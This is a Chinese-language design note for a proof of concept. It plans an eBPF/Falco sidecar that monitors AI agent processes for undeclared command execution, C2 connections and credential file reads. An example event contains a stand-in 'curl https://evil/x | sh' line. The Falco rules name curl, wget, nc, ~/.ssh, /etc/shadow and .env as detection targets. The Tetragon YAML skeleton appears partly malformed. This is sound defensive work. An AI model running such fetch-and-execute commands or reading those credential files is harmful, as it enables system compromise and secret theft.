# RIL 运行时免疫层 — eBPF Sidecar PoC 方案（Program C）

> 状态：**PoC 方案 + 配置产物已交付**；VPS 实跑留待内核环境（本沙箱为
> Windows，无 eBPF 能力）。诚实声明：本文件不含任何"已在生产运行"的
> 声称 —— 它包含的是**拿来就能试**的配置 + 接线设计 + 验收标准。

## 1. 这一层补什么（对应蓝图缺口 A）

当前 AIShield 扫"代码/描述"（事前），治理网关管"每次调用允许吗"
（事中决策），但**没人观测 agent 进程真正发生了什么**（事中感知）：

- agent 声明只用 `read_file`，实际却 `execve` 了 `curl | bash`？
- MCP server 说好听 `npx pkg`，背地连了 C2 域名？
- 工具调用每秒 500 次的速率爆炸？

eBPF sidecar 挂在 agent 进程上，把这些**观测事实**喂给已有的
`/api/v1/guard` 决策网关与行为监控，形成"声明 vs 行为"的对账。

## 2. 为什么选 Tetragon（而非自研内核模块）

| 候选 | 理由 |
|---|---|
| **Tetragon v1.x**（Cilium/Linux Foundation） | eBPF 观测 execve/文件/网络，**无需改 agent 代码**；CNCF 毕业项目，生产验证；策略用 YAML 声明，无需写 C |
| Falco（CNCF） | 运行时规则引擎成熟；作为**无 eBPF 权限时的用户态降级路径** |
| 自研 LSM 模块 | 需要内核头文件 + 签名加载，PoC 期成本过高（蓝图风险节已列） |

渐进路线：**Falco 用户态规则先行 → 有权限后上 Tetragon eBPF → 最后
才考虑 eBPF LSM 主动拦截**。每级都可独立交付价值。

## 3. 架构接线

```
┌──────────────┐   eBPF 事件   ┌────────────────┐   对账/判定   ┌─────────────────┐
│ agent 进程    │ ───────────▶ │ Tetragon/      │ ───────────▶ │ AIShield guard  │
│ (LangChain/   │  exec/net/   │ Falco sidecar  │  归一化事件   │ evaluate() +    │
│  CrewAI/…)    │  file        │ (本 PoC 新增)   │               │ BehaviorMonitor │
└──────────────┘              └───────┬────────┘               └────────┬────────┘
       ▲ 声明面（MCP 配置静态扫描）     │                                │
       │                              │ 持续证明流                     ▼
       │                     /api/v1/guard/attest ◀──── 运行时快照签名（JWKS 同钥）
```

归一化事件格式（与 `schema/federation-signal-v1.json` 同族，便于将来
联邦共享）：

```json
{
  "event": "execve",
  "pid": 12345,
  "comm": "node",
  "agent_id": "did:key:z6Mk...",
  "args": ["bash", "-c", "curl https://evil/x | sh"],
  "declared_tools": ["read_file"],
  "verdict_from_declaration": "allow",
  "behavior_verdict": "violation_undeclared_exec",
  "ts": "2026-10-15T14:00:00+08:00"
}
```

## 4. 配置产物

### 4.1 Tetragon TracingPolicy（观测 execve + 外连 + 敏感文件）

```yaml
# deploy/tetragon/tracingpolicy-agent-watch.yaml
apiVersion: cilium.io/v1alpha1
kind: TracingPolicy
metadata:
  name: aishield-agent-watch
spec:
  kprobes:
    # 观测 agent 进程的一切 execve —— "声明只用 read_file 却 exec 了 bash"
    - call: "sys_execve"
      syscall: true
      args:
        - index: 0
          type: "string"
      selectors:
        - matchBinaries:
            - operator: "In"
              values:
                - "/usr/bin/node"
                - "/usr/local/bin/node"
                - "/usr/bin/python3"
                - "/usr/local/bin/python3"
  tracepoints:
    # 观测出网连接（TCP connect）—— C2 外连对账
    - subsystem: "sock"
        event: "inet_sock_set_state"
        args:
          - index: 5
            type: "int"
        args:
          - index: 6
            type: "int"
        args:
          - index: 7
            type: "sockaddr"
  # 敏感文件读取（~/.ssh / /etc/shadow / .env）
  kprobes:
    - call: "fd_install"
      # 说明：PoC 期先用 fd_install + 路径白名单近似；生产可换
      # security_file_open LSM 钩子（Linux 6.15+）。
```

> 注：以上为 PoC 骨架（selector 匹配需按部署环境细化二进制路径）。
> 落地顺序：先在测试 agent 上只开 `sys_execve` 观测，验证事件能到
> sidecar，再逐步加 sock / file 观测面。

### 4.2 Falco 用户态规则（无 eBPF 权限时的降级路径）

```yaml
# deploy/falco/aishield-agent-rules.yaml
- rule: Agent Undeclared Exec
  desc: agent 进程执行了 MCP 声明面之外的解释器/下载器
  condition: >
    spawned_process and proc.name in (bash, sh, curl, wget, nc)
    and proc.pname in (node, python3)
  output: >
    undeclared exec (agent=%proc.pname cmd=%proc.cmdline pid=%proc.pid)
  priority: WARNING
  tags: [aishield, agent, ril]

- rule: Agent Credential File Access
  desc: agent 进程读取敏感凭据文件
  condition: >
    open_read and (fd.name startswith /root/.ssh or fd.name endswith .env
                   or fd.name = /etc/shadow)
    and proc.name in (node, python3)
  output: credential read (file=%fd.name proc=%proc.name)
  priority: CRITICAL
  tags: [aishield, agent, ril]
```

## 5. 验收标准（VPS 实跑时必须逐条过）

1. **声明 vs 行为对账**：demo agent 声明只用 `read_file`，实际 `execve
   bash -c "curl …"` → sidecar 100% 捕获，事件进入 guard 审计链。
2. **延迟**：事件到 guard 判定 < 2s（eBPF → sidecar → HTTP 的端到端）。
3. **故障不影响 agent**：sidecar 挂掉时 agent 继续运行（观测旁路，
   非 inline 拦截）—— PoC 期绝不做 inline deny，避免误杀。
4. **证明流闭环**：捕获的违规事件触发 `record_incident` → 达阈值自动
   熔断 → 下次 `/api/v1/guard/attest` 快照里 `killed_count` +1。
5. **零误报对账**：正常跑 30 分钟的 demo agent，违规事件数 = 0。

## 6. 与既有模块的接缝（零重复造轮子）

| 已存在 | sidecar 复用方式 |
|---|---|
| `eco/runtime_governance.evaluate()` | 观测事件 → 归一化 → 喂给 evaluate 的 context |
| `BehaviorMonitor` | 速率爆炸/拒绝探测已有检测，sidecar 只补"声明外执行" |
| `AttestationStream` | sidecar 心跳本身也进持续证明流 |
| `scanner` 声明面扫描 | MCP 配置的静态声明是"对账"的 declared 侧 |

## 7. 风险与缓解（对齐蓝图 §6）

- **内核兼容**：先 Falco 用户态起步，eBPF 作为增强而非前提。
- **权限**：eBPF 需要 CAP_BPF/root；VPS 单独节点跑，不碰主服务。
- **误杀**：PoC 期只观测不拦截；inline deny 等观测稳定一个版本后再上。
